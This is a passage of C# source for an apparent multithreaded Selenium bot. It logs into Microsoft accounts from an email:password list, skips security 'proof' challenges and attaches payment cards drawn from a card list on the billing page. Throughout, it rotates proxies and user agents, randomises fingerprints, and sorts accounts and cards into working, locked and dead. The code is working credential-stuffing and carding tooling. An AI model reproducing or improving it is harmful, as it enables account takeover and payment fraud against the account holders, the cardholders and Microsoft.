                                    Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                    monthSelection.Click();
                                    PrintInfo(thread_n, "Card expiry month entered");
                                    Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                }
                            }
                            
                            // Select expiry year with reduced delays
                            var expiryYearOption = FindElementWithWaitClickable(driver, By.Id("input_expiryYear-option"));
                            if (expiryYearOption != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                expiryYearOption.Click();
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                
                                var yearSelection = FindElementWithWaitClickable(driver, By.XPath($"//span[text()='{year}']"));
                                if (yearSelection != null)
                                {
                                    Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                    yearSelection.Click();
                                    PrintInfo(thread_n, "Card expiry year entered");
                                    Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                }
                            }
                            
                            // Tab to CVV field and enter CVV with enhanced reliability
                            Thread.Sleep(TimeSpan.FromMilliseconds(200)); // Reduced from 400ms to 200ms
                            actions.SendKeys(Keys.Tab).SendKeys(Keys.Tab).Perform();
                            Thread.Sleep(TimeSpan.FromMilliseconds(200)); // Reduced from 400ms to 200ms

                            // Enter CVV at faster speed
                            foreach (char c in cvv)
                            {
                                actions.SendKeys(c.ToString()).Perform();
                                Thread.Sleep(30); // Reduced from 60ms to 30ms
                            }
                            
                            PrintInfo(thread_n, "CVV entered character by character");
                            Thread.Sleep(TimeSpan.FromMilliseconds(200)); // Reduced from 400ms to 200ms
                            
                            // Fill address fields with enhanced reliability and validation
                            IWebElement? address_line1 = FindElementWithWait(driver, By.Id("address_line1"));
                            if (address_line1 != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                address_line1.Clear();
                                Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                
                                // Type address at faster speed
                                foreach (char c in adrs_1)
                                {
                                    address_line1.SendKeys(c.ToString());
                                    Thread.Sleep(20); // Reduced from 40ms to 20ms
                                }
                                
                                address_line1.SendKeys(Keys.Return);
                                PrintInfo(thread_n, "Address line 1 entered");
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                
                                // Verify address input
                                string addressValue = address_line1.GetAttribute("value") ?? "";
                                if (addressValue.Length < adrs_1.Length / 2)
                                {
                                    PrintError(thread_n, "Address input seems incomplete, retrying...");
                                    address_line1.Clear();
                                    Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                    address_line1.SendKeys(adrs_1);
                                }
                            }
                            
                            IWebElement? address_line2 = FindElementWithWait(driver, By.Id("address_line2"));
                            if (address_line2 != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                address_line2.Clear();
                                if (!string.IsNullOrEmpty(adrs_2))
                                {
                                    address_line2.SendKeys(adrs_2);
                                }
                                address_line2.SendKeys(Keys.Return);
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                            }
                            
                            IWebElement? cityElement = FindElementWithWait(driver, By.Id("city"));
                            if (cityElement != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                cityElement.Clear();
                                Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                
                                // Type city at faster speed
                                foreach (char c in city)
                                {
                                    cityElement.SendKeys(c.ToString());
                                    Thread.Sleep(20); // Reduced from 40ms to 20ms
                                }
                                
                                cityElement.SendKeys(Keys.Return);
                                PrintInfo(thread_n, "City entered");
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                
                                // Verify city input
                                string cityValue = cityElement.GetAttribute("value") ?? "";
                                if (cityValue.Length < city.Length / 2)
                                {
                                    PrintError(thread_n, "City input seems incomplete, retrying...");
                                    cityElement.Clear();
                                    Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                    cityElement.SendKeys(city);
                                }
                            }

                            // Handle US region selection with reduced delays
                            if (reg_s == "US")
                            {
                                try
                                {
                                    var regionOption = FindElementWithWaitClickable(driver, By.Id("input_region-option"));
                                    if (regionOption != null)
                                    {
                                        Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                        regionOption.Click();
                                        Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                        
                                        var newYorkSelection = FindElementWithWaitClickable(driver, By.XPath($"//span[text()='New York']"));
                                        if (newYorkSelection != null)
                                        {
                                            Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                            newYorkSelection.Click();
                                            Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    PrintError(thread_n, $"Error selecting region: {ex.Message}");
                                }
                            }

                            // Fill postal code with enhanced reliability and validation
                            IWebElement? postal_codeElement = FindElementWithWait(driver, By.Id("postal_code"));
                            if (postal_codeElement != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                postal_codeElement.Clear();
                                Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                
                                // Type postal code at faster speed
                                foreach (char c in postal_code)
                                {
                                    postal_codeElement.SendKeys(c.ToString());
                                    Thread.Sleep(20); // Reduced from 40ms to 20ms
                                }
                                
                                postal_codeElement.SendKeys(Keys.Return);
                                PrintInfo(thread_n, "Postal code entered");
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                
                                // Verify postal code input
                                string postalValue = postal_codeElement.GetAttribute("value") ?? "";
                                if (postalValue.Length < postal_code.Length / 2)
                                {
                                    PrintError(thread_n, "Postal code input seems incomplete, retrying...");
                                    postal_codeElement.Clear();
                                    Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                    postal_codeElement.SendKeys(postal_code);
                                }
                            }

                            PrintInfo(thread_n, "Card details filling completed with optimized speed and enhanced reliability");
                            return true;
                        }
                        catch (Exception ex)
                        {
                            PrintError(thread_n, $"Error filling card details: {ex.Message}");
                            return false;
                        }
                    }


                    // Login function
                    void Login(string card, string acc, string proxy)
                    {
                        AddThreadAction(thread_n, "Starting login process");
                        
                        // Safely parse account credentials
                        string email, password;
                        try
                        {
                            if (!acc.Contains(':'))
                            {
                                throw new Exception("Account format invalid - missing ':' separator");
                            }
                            
                            string[] accParts = acc.Split(':');
                            if (accParts.Length < 2)
                            {
                                throw new Exception("Account format invalid - missing password");
                            }
                            
                            email = accParts[0].Trim();
                            password = accParts[1].Trim();
                            
                            if (string.IsNullOrEmpty(email) || string.IsNullOrEmpty(password))
                            {
                                throw new Exception("Account format invalid - empty email or password");
                            }
                        }
                        catch (Exception ex)
                        {
                            PrintError(thread_n, $"Failed to parse account credentials: {ex.Message}");
                            AddToFailed(acc, card, failed_acc, failed_cc);
                            return;
                        }

                        driver.Navigate().GoToUrl("https://account.microsoft.com/services?lang=en-US#main-content-landing-react");
                        AddThreadAction(thread_n, "Navigated to Microsoft login");

                        // Wait for page to load and check for immediate stalls
                        Thread.Sleep(TimeSpan.FromSeconds(2));
                        
                        // Check for ERR_EMPTY_RESPONSE or "This page isn't working" errors
                        if (HandleEmptyResponseError(driver, proxyy, thread_n, acc, card))
                        {
                            return; // Proxy banned and account requeued
                        }
                        
                        // Check if we're already stuck on "Trying to sign you in" before even entering credentials
                        if (HandleTryingToSignInStall(driver, proxyy, thread_n, acc, card))
                        {
                            return; // Proxy banned and account requeued
                        }

                        IWebElement? emailInput = FindElementWithWait(driver, By.Name("loginfmt"));
                        if (emailInput == null)
                        {
                            throw new Exception("Email input (name='loginfmt') not found");
                        }

                        Thread.Sleep(TimeSpan.FromMilliseconds(600));
                        emailInput.SendKeys(email);
                        emailInput.SendKeys(Keys.Enter);
                        AddThreadAction(thread_n, "Email entered");

                        // Wait and check for stalls after email entry
                        Thread.Sleep(TimeSpan.FromSeconds(2));
                        
                        // Check for ERR_EMPTY_RESPONSE or "This page isn't working" errors
                        if (HandleEmptyResponseError(driver, proxyy, thread_n, acc, card))
                        {
                            return; // Proxy banned and account requeued
                        }
                        
                        if (HandleTryingToSignInStall(driver, proxyy, thread_n, acc, card))
                        {
                            return; // Proxy banned and account requeued
                        }

                        IWebElement? passwordInput = FindElementWithWait(driver, By.Id("passwordEntry"));
                        if (passwordInput == null)
                        {
                            PrintError(thread_n, $"Password input not found, login failed for {email}");
                            AddToLocked(acc, card, failed_acc, failed_cc);
                            return;
                        }

                        Thread.Sleep(TimeSpan.FromMilliseconds(600));
                        passwordInput.SendKeys(password);
                        passwordInput.SendKeys(Keys.Enter);
                        AddThreadAction(thread_n, "Password entered");

                        // Wait a moment for page to react after password entry
                        Thread.Sleep(TimeSpan.FromSeconds(3));
                        
                        // Check for ERR_EMPTY_RESPONSE or "This page isn't working" errors
                        if (HandleEmptyResponseError(driver, proxyy, thread_n, acc, card))
                        {
                            return; // Proxy banned and account requeued
                        }
                        
                        // Check for "Trying to sign you in" stall immediately after password entry
                        if (HandleTryingToSignInStall(driver, proxy, thread_n, acc, card))
                        {
                            // Proxy was banned and account requeued, exit this thread iteration
                            return;
                        }

                        // Check for login stall after password entry with extended timeout
                        int stallCheckAttempts = 0;
                        const int maxStallChecks = 35; // 35 seconds total
                        
                        while (stallCheckAttempts < maxStallChecks)
                        {
                            // Check for ERR_EMPTY_RESPONSE or "This page isn't working" errors first
                            if (HandleEmptyResponseError(driver, proxyy, thread_n, acc, card))
                            {
                                return; // Proxy banned and account requeued
                            }
                            
                            if (IsLoginStalled(driver))
                            {
                                stallCheckAttempts++;
                                Thread.Sleep(TimeSpan.FromSeconds(1));
                                
                                if (stallCheckAttempts >= maxStallChecks)
                                {
                                    PrintError(thread_n, $"Login stalled at 'Trying to sign you in' for {maxStallChecks} seconds - handling with refresh/requeue");
                                    if (HandleTryingToSignInStall(driver, proxyy, thread_n, acc, card))
                                    {
                                        return; // Proxy banned and account requeued
                                    }
                                }
                            }
                            else
                            {
                                break; // No longer stalled, continue
                            }
                        }

                        Thread.Sleep(TimeSpan.FromSeconds(1));

                        // Check for "Too Many Requests" error with retry logic
                        if (HandleTooManyRequestsError(driver, proxyy, thread_n, acc, card))
                        {
                            // Proxy was banned and account requeued, exit this thread iteration
                            return;
                        }

                        // Check for Microsoft authentication error
                        if (HandleMicrosoftAuthError(driver, proxyy, thread_n, acc, card))
                        {
                            // Proxy was banned and account requeued, exit this thread iteration
                            return;
                        }

                        Thread.Sleep(TimeSpan.FromSeconds(1));

                        if (driver.Url.Contains("Abuse") || driver.Url.Contains("VerifyUsage"))
                        {
                            PrintError(thread_n, $"Account {email} is locked or requires verification");
                            AddToLocked(acc, card, failed_acc, failed_cc);
                            return;
                        }

                        // Handle privacy notice and skip challenges in a loop until we reach payment page
                        int maxHandlingAttempts = 8; // Increased from implicit handling
                        for (int handlingAttempt = 0; handlingAttempt < maxHandlingAttempts; handlingAttempt++)
                        {
                            bool actionTaken = false;
                            
                            // Handle privacy notice
                            if (driver.Url.Contains("privacynotice"))
                            {
                                try
                                {
                                    Thread.Sleep(TimeSpan.FromMilliseconds(600));
                                    IWebElement? ok_button1 = FindElementWithWait(driver, By.XPath("//*[text()='OK']"), 5);
                                    if (ok_button1 != null && ok_button1.Displayed)
                                    {
                                        ok_button1.Click();
                                        actionTaken = true;
                                        AddThreadAction(thread_n, $"Privacy notice OK clicked (attempt {handlingAttempt + 1})");
                                    }

                                    Thread.Sleep(TimeSpan.FromMilliseconds(500));
                                    IWebElement? ok_button2 = FindElementWithWait(driver, By.XPath("//*[text()='OK']"), 3);
                                    if (ok_button2 != null && ok_button2.Displayed)
                                    {
                                        ok_button2.Click();
                                        actionTaken = true;
                                        AddThreadAction(thread_n, $"Second privacy notice OK clicked (attempt {handlingAttempt + 1})");
                                    }
                                }
                                catch (Exception ok_ex)
                                {
                                    PrintInfo(thread_n, $"Error clicking 'OK' buttons (might not be present): {ok_ex.Message}");
                                }
                            }
                            
                            // Handle proof challenges (skip buttons)
                            if (driver.Url.Contains("proofs"))
                            {
                                try
                                {
                                    IWebElement? skipButton = FindElementWithWait(driver, By.Id("iShowSkip"), 5);
                                    if (skipButton != null)
                                    {
                                        skipButton.SendKeys(Keys.Return);
                                        actionTaken = true;
                                        AddThreadAction(thread_n, $"Proof challenge skipped (attempt {handlingAttempt + 1})");
                                        PrintInfo(thread_n, $"Proof challenge skipped successfully (attempt {handlingAttempt + 1})");
                                    }
                                }
                                catch (Exception skip_ex)
                                {
                                    PrintInfo(thread_n, $"Error handling proof challenge: {skip_ex.Message}");
                                }
                            }
                            
                            // Check if we've reached a stable state (payment page or services page)
                            if (driver.Url.Contains("billing/payments") || 
                                (driver.Url.Contains("services") && !driver.Url.Contains("proofs") && !driver.Url.Contains("privacynotice")))
                            {
                                PrintInfo(thread_n, $"Reached stable page after {handlingAttempt + 1} handling attempts");
                                break;
                            }
                            
                            // If no action was taken and we're not on expected pages, break to avoid infinite loop
                            if (!actionTaken && !driver.Url.Contains("proofs") && !driver.Url.Contains("privacynotice"))
                            {
                                PrintInfo(thread_n, $"No more challenges to handle after {handlingAttempt + 1} attempts");
                                break;
                            }
                            
                            // Small delay between attempts
                            Thread.Sleep(TimeSpan.FromSeconds(1));
                        }

                        IWebElement? yes_button = FindElementWithWait(driver, By.XPath("//*[text()='Yes']"));
                        if (yes_button != null)
                        {
                            Thread.Sleep(TimeSpan.FromMilliseconds(600));
                            yes_button.Click();
                            Thread.Sleep(TimeSpan.FromSeconds(1));
                            AddThreadAction(thread_n, "Clicked 'Yes' button");
                            
                            // Give time for any additional challenges to appear after Yes button
                            Thread.Sleep(TimeSpan.FromSeconds(2));
                            
                            // Handle any remaining challenges after Yes button
                            int postYesAttempts = 0;
                            while (postYesAttempts < 3 && (driver.Url.Contains("proofs") || driver.Url.Contains("privacynotice")))
                            {
                                postYesAttempts++;
                                bool actionTaken = false;
                                
                                if (driver.Url.Contains("proofs"))
                                {
                                    try
                                    {
                                        IWebElement? skipButton = FindElementWithWait(driver, By.Id("iShowSkip"), 5);
                                        if (skipButton != null)
                                        {
                                            skipButton.SendKeys(Keys.Return);
                                            actionTaken = true;
                                            AddThreadAction(thread_n, $"Post-Yes proof challenge skipped (attempt {postYesAttempts})");
                                            PrintInfo(thread_n, $"Post-Yes proof challenge skipped successfully (attempt {postYesAttempts})");
                                        }
                                    }
                                    catch (Exception skip_ex)
                                    {
                                        PrintInfo(thread_n, $"Error handling post-Yes proof challenge: {skip_ex.Message}");
                                    }
                                }
                                
                                if (driver.Url.Contains("privacynotice"))
                                {
                                    try
                                    {
                                        IWebElement? ok_button = FindElementWithWait(driver, By.XPath("//*[text()='OK']"), 3);
                                        if (ok_button != null && ok_button.Displayed)
                                        {
                                            ok_button.Click();
                                            actionTaken = true;
                                            AddThreadAction(thread_n, $"Post-Yes privacy notice OK clicked (attempt {postYesAttempts})");
                                        }
                                    }
                                    catch (Exception ok_ex)
                                    {
                                        PrintInfo(thread_n, $"Error clicking post-Yes OK button: {ok_ex.Message}");
                                    }
                                }
                                
                                if (!actionTaken)
                                {
                                    break;
                                }
                                
                                Thread.Sleep(TimeSpan.FromSeconds(1));
                            }
                        }

                        Thread.Sleep(TimeSpan.FromSeconds(1));
                        PrintSuccess(thread_n, $"Logged in as {email}");
                        driver.Navigate().GoToUrl("https://account.microsoft.com/billing/payments?lang=en-US#main-content-landing-react");
                        PrintInfo(thread_n, "Navigated to payment page");
                        AddThreadAction(thread_n, "Login completed successfully");

                        // Wait for payment page to load with 30-second timeout
                        bool paymentPageLoaded = false;
                        DateTime paymentPageStartTime = DateTime.Now;
                        const int paymentPageTimeoutSeconds = 120; // Increased from 60 to 120 seconds for better reliability
                        
                        PrintInfo(thread_n, "Waiting for payment page to load (60s timeout)...");
                        AddThreadAction(thread_n, "Waiting for payment page to load");
                        
                        while (!paymentPageLoaded && (DateTime.Now - paymentPageStartTime).TotalSeconds < paymentPageTimeoutSeconds)
                        {
                            try
                            {
                                // Check for ERR_EMPTY_RESPONSE or "This page isn't working" errors
                                if (HandleEmptyResponseError(driver, proxyy, thread_n, acc, card))
                                {
                                    return; // Proxy banned and account requeued
                                }
                                
                                // Check if we're still stuck on "Trying to sign you in"
                                if (HandleTryingToSignInStall(driver, proxyy, thread_n, acc, card))
                                {
                                    return; // Proxy banned and account requeued
                                }
                                
                                // Check for "Too Many Requests" error
                                if (HandleTooManyRequestsError(driver, proxyy, thread_n, acc, card))
                                {
                                    return; // Proxy was banned and account requeued
                                }
                                
                                // Check for Microsoft authentication error
                                if (HandleMicrosoftAuthError(driver, proxyy, thread_n, acc, card))
                                {
                                    return; // Proxy was banned and account requeued
                                }
                                
                                // Check if payment page elements are present
                                var addPaymentButton = driver.FindElements(By.XPath("//span[text()='Add payment method']"));
                                var changeElement = driver.FindElements(By.XPath("//*[text()='Change']"));
                                
                                if (addPaymentButton.Count > 0 || changeElement.Count > 0)
                                {
                                    paymentPageLoaded = true;
                                    PrintSuccess(thread_n, "Payment page loaded successfully");
                                    AddThreadAction(thread_n, "Payment page loaded");
                                    break;
                                }
                                
                                // Check if we're on the payment billing page (alternative indicator)
                                if (driver.Url.Contains("billing/payments") && 
                                    (driver.PageSource.Contains("payment method") || 
                                     driver.PageSource.Contains("Add payment") || 
                                     driver.PageSource.Contains("Payment methods")))
                                {
                                    paymentPageLoaded = true;
                                    PrintSuccess(thread_n, "Payment billing page loaded successfully");
                                    AddThreadAction(thread_n, "Payment billing page loaded");
                                    break;
                                }
                                
                                Thread.Sleep(1000); // Wait 1 second before checking again
                            }
                            catch (Exception ex)
                            {
                                PrintError(thread_n, $"Error while waiting for payment page: {ex.Message}");
                                Thread.Sleep(1000);
                            }
                        }
                        
                        // Check if payment page load timed out
                        if (!paymentPageLoaded)
                        {
                            PrintError(thread_n, $"Payment page failed to load within {paymentPageTimeoutSeconds} seconds");
                            
                            // Try one more time with a direct navigation before giving up
                            try
                            {
                                PrintInfo(thread_n, "Attempting direct navigation to payment page as fallback...");
                                driver.Navigate().GoToUrl("https://account.microsoft.com/billing/payments");
                                Thread.Sleep(5000);
                                
                                // Check again for payment page elements
                                var retryAddPaymentButton = driver.FindElements(By.XPath("//span[text()='Add payment method']"));
                                var retryChangeElement = driver.FindElements(By.XPath("//*[text()='Change']"));
                                
                                if (retryAddPaymentButton.Count > 0 || retryChangeElement.Count > 0 || 
                                    (driver.PageSource.Contains("payment method") || driver.PageSource.Contains("Add payment")))
                                {
                                    PrintSuccess(thread_n, "Payment page loaded successfully after direct navigation");
                                    paymentPageLoaded = true;
                                }
                            }
                            catch (Exception retryEx)
                            {
                                PrintError(thread_n, $"Direct navigation fallback failed: {retryEx.Message}");
                            }
                            
                            // If still not loaded, requeue account but only ban proxy after multiple failures
                            if (!paymentPageLoaded)
                            {
                                PrintError(thread_n, "Payment page load failed even after fallback - requeuing account");
                                AddThreadAction(thread_n, "Payment page timeout - requeuing account");
                                // Only ban proxy if this is a repeated failure (could implement a failure counter)
                                RequeueAccount(acc, card);
                                return;
                            }
                        }

                        // Check for existing card (account already has payment method)
                        IWebElement? changeElement2 = FindElementWithWait(driver, By.XPath("//*[text()='Change']"), 3);
                        if (changeElement2 != null)
                        {
                            AddToSuccess(acc, card, success_acc, success_cc);
                            PrintSuccess(thread_n, "Account already has a card - added to success");
                            return;
                        }
                        
                        Thread.Sleep(TimeSpan.FromSeconds(2));
                        Add_payment("Canada");
                    }

                    Login(card, acc, "");
                }
                catch (Exception e)
                {
                    try
                    {
                        // First check if the driver shows ERR_EMPTY_RESPONSE or "This page isn't working"
                        if (driver != null && HandleEmptyResponseError(driver, proxyy, thread_n, acc, card))
                        {
                            return; // Proxy banned and account requeued
                        }
                    }
                    catch
                    {
                        // If we can't check the driver, continue with regular error handling
                    }
                    
                    // Check if it's a timeout or proxy-related error
                    if (IsPageTimeoutOrProxyIssue(e))
                    {
                        PrintError(thread_n, $"Page timeout or network issue detected: {e.Message}");
                        if (is_use_proxy && !string.IsNullOrWhiteSpace(proxyy))
                        {
                            PrintError(thread_n, "Banning current proxy and requeuing account");
                            BanCurrentProxy(proxyy);
                            AddThreadAction(thread_n, "Timeout/proxy error - account requeued");
                        }
                        else
                        {
                            AddThreadAction(thread_n, "Timeout/network error - account requeued");
                        }
                        RequeueAccount(acc, card);
                        return; // Exit this thread iteration to retry
                    }
                    else
                    {
                        AddToFailed(acc, card, failed_acc, failed_cc, true);
                        PrintError(thread_n, "System error occurred during card addition");
                        AddThreadAction(thread_n, $"Exception: {e.Message}");
                    }
                } // End of catch block
                finally
                {
                    AddThreadAction(thread_n, "Cleaning up resources");
                    
                    // Release current card from global used cards if it's not dead
                    if (!string.IsNullOrEmpty(card))
                    {
                        try
                        {
                            // Only release if the card wasn't marked as dead
                            lock (cardLock)
                            {
                                if (!globalDeadCards.Contains(card))
                                {
                                    ReleaseCardFromGlobalUsed(card, thread_n);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            PrintError(thread_n, $"Error releasing card from global used: {ex.Message}");
                        }
                    }
                    
                    try
                    {
                        driver?.Quit();
                    }
                    catch (Exception ex)
                    {
                        AddThreadAction(thread_n, $"Driver cleanup error: {ex.Message}");
                    }
                    
                    try
                    {
                        proxyServer?.Stop();
                    }
                    catch (Exception ex)
                    {
                        AddThreadAction(thread_n, $"Proxy cleanup error: {ex.Message}");
                    }
                    
                    // Clean up thread actions if thread is ending
                    lock (threadActionsLock)
                    {
                        if (threadActions.ContainsKey(thread_n))
                        {
                            threadActions[thread_n].Add($"{DateTime.Now:HH:mm:ss} - Thread iteration completed");
                        }
                    }
                    
                    // Brief delay before next iteration to prevent rapid cycling (only if not exiting)
                    if (!is_exit)
                    {
                        try
                        {
                            Task.Delay(3000).GetAwaiter().GetResult();
                        }
                        catch (Exception ex)
                        {
                            AddThreadAction(thread_n, $"Delay error: {ex.Message}");
                            Thread.Sleep(3000); // Fallback delay
                        }
                    }
                    else
                    {
                        AddThreadAction(thread_n, "Exit requested - thread stopping");
                    }
                }
            }
            catch (Exception ex)
            {
                AddThreadAction(thread_n, $"Fatal thread error: {ex.Message}");
                
                // Clean up resources in case of fatal error
                try
                {
                    driver?.Quit();
                }
                catch { }
                
                try
                {
                    proxyServer?.Stop();
                }
                catch { }
            }
            
            // Only restart if not exiting
            if (!is_exit)
            {
                AddThreadAction(thread_n, "Thread restarting after iteration");
                Run(s, thread_n); // Recursive call moved outside try-catch to prevent stack overflow in finally
            }
            else
            {
                AddThreadAction(thread_n, "Thread terminated");
            }
        }

        static void DecideThreads(int numThreads, string fileName)
        {
            var threads = new List<Thread>();
            
            // Initialize proxy list at startup
            if (is_use_proxy)
            {
                lock (proxyLock)
                {
                    string proxyPath = Path.Combine(GetBaseDir(), "sor/proxy.txt");
                    if (File.Exists(proxyPath))
                    {
                        proxyList = File.ReadAllLines(proxyPath).Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
                        // Removed direct console output to prevent "out of place" messages
                    }
                }
            }
            
            // Pre-initialize all thread tracking for better display
            lock (threadActionsLock)
            {
                for (int i = 0; i < numThreads; i++)
                {
                    if (!threadActions.ContainsKey(i))
                    {
                        threadActions[i] = new List<string> { $"{DateTime.Now:HH:mm:ss} - Thread {i + 1} waiting to start" };
                    }
                }
            }
            
            // Update progress to show all initialized threads
            UpdateProgress();
            
            for (int i = 0; i < numThreads; i++)
            {
                if (is_exit) return;
                int index = i;
                Thread thread = new Thread(() => 
                {
                    try
                    {
                        Run(fileName, index);
                    }
                    catch (Exception ex)
                    {
                        // Removed direct console output to prevent "out of place" messages
                        AddThreadAction(index, $"Thread error: {ex.Message}");
                    }
                });
                threads.Add(thread);
                thread.Start();
                
                // Update thread status to starting
                AddThreadAction(index, $"Thread {index + 1} starting...");
                
                // Removed direct console output to prevent "out of place" messages
                Thread.Sleep(4000); // Stagger thread starts
            }
            threads.ForEach(t => t.Join());
        }

        static void RunInfinite()
        {
            DisplayWelcomeMessage();
            
            // Ensure required files exist with default content
            EnsureRequiredFilesExist();
            
            // Load used user agents from previous sessions
            LoadUsedUserAgents();
            
            // Check required files exist
            var requiredFiles = new List<string>
            {
                "sor/acc.txt",
                "sor/cc.txt",
                "sor/listofnames.txt",
                "sor/useragents.txt"
            };

            if (is_use_proxy)
            {
                requiredFiles.Add("sor/proxy.txt");
            }

            bool filesOk = true;
            foreach (string file in requiredFiles)
            {
                string fullPath = Path.Combine(GetBaseDir(), file);
                if (!File.Exists(fullPath))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Error: Required file {file} not found!");
                    Console.ResetColor();
                    filesOk = false;
                }
                else if (new FileInfo(fullPath).Length == 0)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Error: File {file} is empty!");
                    Console.ResetColor();
                    filesOk = false;
                }
                else
                {
                    // Show file counts
                    int lineCount = File.ReadLines(fullPath).Count(l => !string.IsNullOrWhiteSpace(l));
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"✓ {file}: {lineCount} entries loaded");
                    Console.ResetColor();
                    
                    // Initialize original card count for progress tracking
                    if (file == "sor/cc.txt")
                    {
                        originalCardCount = lineCount;
                    }
                }
            }

            if (!filesOk)
            {
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
                return;
            }

            Console.Write("\nEnter the number of threads to run: ");
            string? threadInput = Console.ReadLine();

            int numThreads = 1;
            while (!int.TryParse(threadInput, out numThreads) || numThreads < 1)
            {
                Console.Write("Please enter a valid number of threads (minimum 1): ");
                threadInput = Console.ReadLine();
            }

            Console.Write("Show browser? (y/n): ");
            string? answer = Console.ReadLine();
            show_browser = answer?.ToLower() == "y";

            Console.Clear();
            DisplayWelcomeMessage();
            Console.WriteLine($"\nStarting with {numThreads} thread(s)...");
            Console.WriteLine($"Browser visibility: {(show_browser ? "Visible" : "Hidden")}");
            Console.WriteLine(is_use_proxy
                ? "Proxy distribution: Round-robin across available proxies"
                : "Proxy mode: Disabled (proxyless)");
            Console.WriteLine($"Enhanced features: Random fingerprinting, User agent rotation, Thread action tracking");
            
            // Start periodic progress updates (reduced frequency to minimize flickering)
            StartProgressUpdates();
            UpdateProgress();

            while (true)
            {
                DecideThreads(numThreads, "file.cs");
                if (is_exit) break;
                Thread.Sleep(5000); // Wait 5 seconds before restarting threads
            }

            // Stop progress updates
            StopProgressUpdates();
            Console.WriteLine("\nAll tasks completed. Press any key to exit...");
            Console.ReadKey();
        }

        private static Timer? progressUpdateTimer;
        private static readonly object timerLock = new object();

        private static void StartProgressUpdates()
        {
            lock (timerLock)
            {
                if (progressUpdateTimer == null)
                {
                    // Update progress every 2 seconds to reduce flickering
                    progressUpdateTimer = new Timer(_ => UpdateProgress(), null, TimeSpan.Zero, TimeSpan.FromSeconds(2));
                }
            }
        }

        private static void StopProgressUpdates()
        {
            lock (timerLock)
            {
                if (progressUpdateTimer != null)
                {
                    progressUpdateTimer.Dispose();
                    progressUpdateTimer = null;
                }
            }
        }

        static void Main(string[] args)
        {
            // Set console encoding for better character support
            try
            {
                Console.OutputEncoding = System.Text.Encoding.UTF8;
            }
            catch
            {
                // If UTF-8 fails, continue with default encoding
            }
            
            // Handle Ctrl+C gracefully
            Console.CancelKeyPress += (sender, e) => {
                e.Cancel = true;
                is_exit = true;
                StopProgressUpdates();
                Console.WriteLine("\nShutdown initiated. Stopping all threads safely...");
                Environment.Exit(0);
            };
            
            RunInfinite();
        }
    }
}